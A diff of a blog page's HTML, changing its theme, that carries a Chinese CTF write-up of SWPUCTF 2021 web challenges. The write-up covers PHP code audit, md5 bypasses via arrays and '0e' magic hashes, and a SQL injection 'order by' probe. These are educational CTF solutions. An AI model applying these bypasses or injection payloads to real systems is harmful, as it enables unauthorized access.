@@ -1,904 +1,360 @@
-
-
 <!DOCTYPE html>
-<html lang="en" data-default-color-scheme=auto>
-
-
-
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/SecureNexusLab.png">
-  <link rel="icon" href="/img/SecureNexusLab.png">
-  
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="zer0ptr">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="[SWPUCTF 2021 新生赛]gift_F12Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可 [SWPUCTF 2021 新生赛]jicao&lt;?php highlight_file(&#x27;index.php&#x27;); include(&quot;flag.php&quot;); $id&#x3D;$_POST[&#x27;id&#x27;]; $json&#x3D;json_decod">
-<meta property="og:type" content="article">
-<meta property="og:title" content="SWPUCTF2021新生赛Web刷题记录">
-<meta property="og:url" content="https://zer0ptr.github.io/2025/07/21/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
-<meta property="og:site_name" content="zer0ptr&#39;s Blog">
-<meta property="og:description" content="[SWPUCTF 2021 新生赛]gift_F12Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可 [SWPUCTF 2021 新生赛]jicao&lt;?php highlight_file(&#x27;index.php&#x27;); include(&quot;flag.php&quot;); $id&#x3D;$_POST[&#x27;id&#x27;]; $json&#x3D;json_decod">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-2.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-3.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-4.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-sql-2.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-sql-3.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-sql-4.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-include-1.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-include-2.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-include-3.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-easyrce-1.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-easyrce-2.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-http-1.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-http-2.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-http-3.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-http-3.png">
-<meta property="article:published_time" content="2025-07-21T10:59:46.000Z">
-<meta property="article:modified_time" content="2025-07-29T11:06:46.194Z">
-<meta property="article:author" content="zer0ptr">
-<meta property="article:tag" content="Web">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-2.png">
-  
-  
-  
-  <title>SWPUCTF2021新生赛Web刷题记录 - zer0ptr&#39;s Blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"zer0ptr.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-  <script src="/js/sakura.js"></script>
-  <script src="/js/love.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>
+        
+            SWPUCTF2021新生赛Web刷题记录 | zer0ptr&#39;s Blog
+        
+    </title>
+    
+    <!-- Meta tags -->
+    <meta name="description" content="">
+    <meta name="author" content="zer0ptr">
+    
+    <!-- 关键CSS内联 -->
+    <style>
+        /* 关键渲染路径CSS */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6; color: #333; background-color: #fff; font-size: 17px; overflow-x: hidden;
+        }
+        .container { max-width: 650px; margin: 0 auto; padding: 0 15px; }
+        .loading-indicator {
+            position: fixed; top: 0; left: 0; width: 100%; height: 3px;
+            background: linear-gradient(90deg, #007acc, #4fc3f7);
+            transform: translateX(-100%); transition: transform 0.3s ease; z-index: 9999;
+        }
+        .loading-indicator.active { animation: loadingProgress 1s ease-in-out infinite; }
+        @keyframes loadingProgress {
+            0% { transform: translateX(-100%); }
+            50% { transform: translateX(0%); }
+            100% { transform: translateX(100%); }
+        }
+    </style>
+    
+    <!-- 异步加载完整CSS -->
+    <link rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+    
+    <!-- CSS加载polyfill -->
+    <script>
+        // 确保CSS异步加载在所有浏览器中正常工作
+        !function(e){"use strict";var t=function(t,n,r){function o(e){return i.body?e():void setTimeout(function(){o(e)})}function a(){d.addEventListener&&d.removeEventListener("load",a),d.media=r||"all"}var i=e.document,d=i.createElement("link");if(n)d.id=n;d.rel="stylesheet",d.href=t,d.media="only x",o(function(){i.head.appendChild(d)}),setTimeout(a);return d};e.loadCSS=t}(this);
+    </script>
+    
+    <!-- 预加载关键资源 -->
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net">
+    
+    <!-- 按需加载Highlight.js CSS -->
+    
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    
+    
+    <!-- 按需加载MathJax -->
+    
+        <script>
+            window.MathJax = {
+                tex: {
+                    inlineMath: [['$', '$'], ['\\(', '\\)']],
+                    displayMath: [['$$', '$$'], ['\\[', '\\]']],
+                    processEscapes: true,
+                    processEnvironments: true
+                },
+                options: {
+                    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+                }
+            };
+        </script>
+        <script defer src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    
+    <!-- 预加载JavaScript -->
+    <link rel="preload" href="/js/search.js" as="script">
+    <link rel="preload" href="/js/script.js" as="script">
 <meta name="generator" content="Hexo 7.3.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head>
-
-
 <body>
-  
-
-  <header>
+    <!-- 加载指示器 -->
+    <div class="loading-indicator" id="loadingIndicator"></div>
+    <!-- Top Navigation Bar -->
     
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>zer0ptr&#39;s blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>Home</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>Archives</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>Categories</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>Tags</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>About</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/" target="_self">
-                <i class="iconfont icon-link-fill"></i>
-                <span>Links</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/background.PNG') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="SWPUCTF2021新生赛Web刷题记录"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-07-21 18:59" pubdate>
-          July 21, 2025 pm
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          1k words
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          9 mins
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">SWPUCTF2021新生赛Web刷题记录</h1>
-            
-            
-              <div class="markdown-body">
+    <nav class="top-navigation">
+        <div class="container">
+            <div class="nav-brand">
+                <a href="/" class="nav-brand-link">
+                    zer0ptr&#39;s blog
+                </a>
+            </div>
+            <ul class="top-nav-list">
                 
-                <h2 id="SWPUCTF-2021-新生赛-gift-F12"><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h2><p>Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可</p>
-<h2 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);
-<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
-<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
-<span class="hljs-variable">$json</span>=<span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;json&#x27;</span>],<span class="hljs-literal">true</span>);
-<span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>==<span class="hljs-string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;x&#x27;</span>]==<span class="hljs-string">&quot;wllm&quot;</span>)
-&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;&#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+                    <li class="top-nav-item">
+                        <a href="/archives" class="top-nav-link">
+                            Archives
+                        </a>
+                    </li>
+                
+                    <li class="top-nav-item">
+                        <a href="/categories" class="top-nav-link">
+                            Categories
+                        </a>
+                    </li>
+                
+                    <li class="top-nav-item">
+                        <a href="/tags" class="top-nav-link">
+                            Tags
+                        </a>
+                    </li>
+                
+                    <li class="top-nav-item">
+                        <a href="/about" class="top-nav-link">
+                            About
+                        </a>
+                    </li>
+                
+                <li class="top-nav-item">
+                    <a href="https://github.com" class="top-nav-link" target="_blank">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+                            <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+                        </svg>
+                    </a>
+                </li>
+                <li class="top-nav-item">
+                    <a href="#" class="top-nav-link search-toggle">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+                            <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/>
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+    
+    
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-content">
+                <h1 class="site-title">
+                    <a href="/">
+                        zer0ptr&#39;s blog
+                    </a>
+                </h1>
+                
+                    <p class="site-subtitle">
+                        Walking on my way🧐.
+                    </p>
+                
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content page-transition" id="mainContent">
+            <article class="post">
+    <!-- Post Header -->
+    <header class="post-header">
+        
+            <div class="post-meta">
+                
+                    <a href="/categories/CTF/" class="category-link">
+                        CTF
+                    </a>
+                
+            </div>
+        
+        
+        <h1 class="post-title">SWPUCTF2021新生赛Web刷题记录</h1>
+        
+        <div class="post-info">
+            <time class="post-date" datetime="2025-07-21T10:59:46.000Z">
+                July 21, 2025
+            </time>
+            
+            
+            
+            
+        </div>
+        
+        
+            <div class="post-tags">
+                
+                    <a href="/tags/Web/" class="tag-link">
+                        #Web
+                    </a>
+                
+                    <a href="/tags/CTF/" class="tag-link">
+                        #CTF
+                    </a>
+                
+            </div>
+        
+    </header>
+    
+    <!-- Post Content -->
+    <div class="post-content">
+        <h2 id="SWPUCTF-2021-新生赛-gift-F12"><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h2><p>Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可</p>
+<h2 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>代码审计，以post方式传<code>id=wllmNB</code>和以get方式传<code>json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</code>即可</p>
-<h2 id="SWPUCTF-2021-新生赛-easy-md5"><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
- <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
- <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag2.php&#x27;</span>;
- 
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;
-    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
-    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
-    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> != <span class="hljs-variable">$password</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$name</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>))&#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
-    &#125;
-    <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wrong!&quot;</span>;
-    &#125;
- 
-&#125;
-<span class="hljs-keyword">else</span> &#123;
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;wrong!&#x27;</span>;
-&#125;
-<span class="hljs-meta">?&gt;</span>
-wrong!</code></pre></div>
+<h2 id="SWPUCTF-2021-新生赛-easy-md5"><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;flag2.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wrong!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">wrong!</span><br></pre></td></tr></table></figure>
 
 <p>要求：<code>name</code>的值不等于<code>password</code>的值且其md5后相等</p>
 <p>两种方法：</p>
-<h4 id="1-数组漏洞绕过"><a href="#1-数组漏洞绕过" class="headerlink" title="1.数组漏洞绕过"></a>1.数组漏洞绕过</h4><p><img src="/images/SWPUCTF-Web-2.png" srcset="/img/loading.gif" lazyload alt="图一展示了利用数组漏洞以进行绕过"></p>
+<h4 id="1-数组漏洞绕过"><a href="#1-数组漏洞绕过" class="headerlink" title="1.数组漏洞绕过"></a>1.数组漏洞绕过</h4><p><img src="/images/SWPUCTF-Web-2.png" alt="图一展示了利用数组漏洞以进行绕过"></p>
 <p>原理：PHP md5函数接收的参数为string（字符串型），如果传入arry（数组型）就无法计算其md5值，但不会报错，导致数组md5值都相等</p>
-<h4 id="2-PHP弱比较"><a href="#2-PHP弱比较" class="headerlink" title="2.PHP弱比较"></a>2.PHP弱比较</h4><p><img src="/images/SWPUCTF-Web-3.png" srcset="/img/loading.gif" lazyload alt="图二展示了利用PHP弱比较以进行绕过"></p>
+<h4 id="2-PHP弱比较"><a href="#2-PHP弱比较" class="headerlink" title="2.PHP弱比较"></a>2.PHP弱比较</h4><p><img src="/images/SWPUCTF-Web-3.png" alt="图二展示了利用PHP弱比较以进行绕过"></p>
 <p>原理：PHP在进行“&#x3D;&#x3D;”（弱类型比较）时，会先转换字符串类型，再进行字符串比较，而进行md5后以0e开头的都会被PHP识别为科学计数法，即<code>0e*</code>被视作0的<code>*</code>次方，结果都为0，故我们只需找到md5后为<code>0e*</code>的字符串，常用md5后为<code>0e*</code>的有：</p>
-<div class="code-wrapper"><pre><code class="hljs dns">字符串         对应md5值
-
-<span class="hljs-number">240610708</span>      <span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span>
-
-QLTHNDT       <span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span>
-
-QNKCDZO      <span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span>
-
-PJNPDWY       <span class="hljs-number">0</span>e2915290528947027745<span class="hljs-number">57631701704</span>
-
-NWWKITQ      <span class="hljs-number">0</span>e7630820709760383476<span class="hljs-number">57360817689</span>
-
-NOOPCJF       <span class="hljs-number">0</span>e818888003657176127<span class="hljs-number">862245791911</span>
-
-MMHUWUV    <span class="hljs-number">0</span>e701732711630150438<span class="hljs-number">129209816536</span>
-
-MAUXXQC     <span class="hljs-number">0</span>e4784784668484390404<span class="hljs-number">34801845361</span></code></pre></div>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">字符串         对应md5值</span><br><span class="line"></span><br><span class="line"><span class="number">240610708</span>      <span class="number">0</span>e4620974319065090195<span class="number">62988736854</span></span><br><span class="line"></span><br><span class="line">QLTHNDT       <span class="number">0</span>e40596782540195537<span class="number">2549139051580</span></span><br><span class="line"></span><br><span class="line">QNKCDZO      <span class="number">0</span>e830400451993494058<span class="number">024219903391</span></span><br><span class="line"></span><br><span class="line">PJNPDWY       <span class="number">0</span>e2915290528947027745<span class="number">57631701704</span></span><br><span class="line"></span><br><span class="line">NWWKITQ      <span class="number">0</span>e7630820709760383476<span class="number">57360817689</span></span><br><span class="line"></span><br><span class="line">NOOPCJF       <span class="number">0</span>e818888003657176127<span class="number">862245791911</span></span><br><span class="line"></span><br><span class="line">MMHUWUV    <span class="number">0</span>e701732711630150438<span class="number">129209816536</span></span><br><span class="line"></span><br><span class="line">MAUXXQC     <span class="number">0</span>e4784784668484390404<span class="number">34801845361</span></span><br></pre></td></tr></table></figure>
 
 <p>注：以上字符串要记得两个及两个以上，对应md5值不用记</p>
-<h2 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h2><p><img src="/images/SWPUCTF-Web-4.png" srcset="/img/loading.gif" lazyload alt="图三展示了题目中给的提示和一个很大只的杰哥"></p>
-<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1 --+</span></code></pre></div>
+<h2 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h2><p><img src="/images/SWPUCTF-Web-4.png" alt="图三展示了题目中给的提示和一个很大只的杰哥"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1 --+</span></span><br></pre></td></tr></table></figure>
 
 
 
